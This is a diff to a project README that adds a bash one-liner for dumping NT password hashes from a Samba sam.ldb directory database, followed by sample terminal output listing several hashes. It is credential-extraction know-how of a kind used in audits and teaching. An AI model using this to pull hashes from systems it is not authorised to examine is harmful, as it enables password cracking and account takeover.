@@ -70,6 +70,22 @@ My Synology with Directory Server installed already had `ldapsearch`, so I assum
   + samba
   + ldb
 
+## Other Information
+
+I also made this quick, dirty bash one-liner to extract just the hashes. This *will not* show you what user or computer the hashes belong to and relies on having `ldbsearch` installed, but it's nice for quick extraction. Replace `sam.ldb` with your relevant file location.
+
+```sh
+data=$(ldbsearch -H sam.ldb unicodepwd | grep 'unicodePwd' | awk -F ' ' {'print $2'}); while IFS= read -r line; do python -c "import codecs ; import binascii; print (binascii.hexlify(codecs.decode( '$line' , 'base64')))"; done <<< $data
+```
+
+```
+slick㉿kubuntu:~$ data=$(ldbsearch -H sam.ldb unicodepwd | grep 'unicodePwd' | awk -F ' ' {'print $2'}); while IFS= read -r line; do python -c "import codecs ; import binascii; print (binascii.hexlify(codecs.decode( '$line' , 'base64')))"; done <<< $data 
+af618854faa213f29760a9dd225cafc4
+4b287445eeb20f4f5c4c5f888e970c6b
+841a370075da4fa12968d5b58e8ffdaa
+(...)
+```
+
 ## Disclaimer
 
-This project is intended for educational purposes only and cannot be used for law violation or personal gain. The author of this project is not responsible for any possible harm caused by the materials.
+This project is intended for educational purposes only and cannot be used for law violation or personal gain. The author of this project is not responsible for any possible harm caused by the materials. 
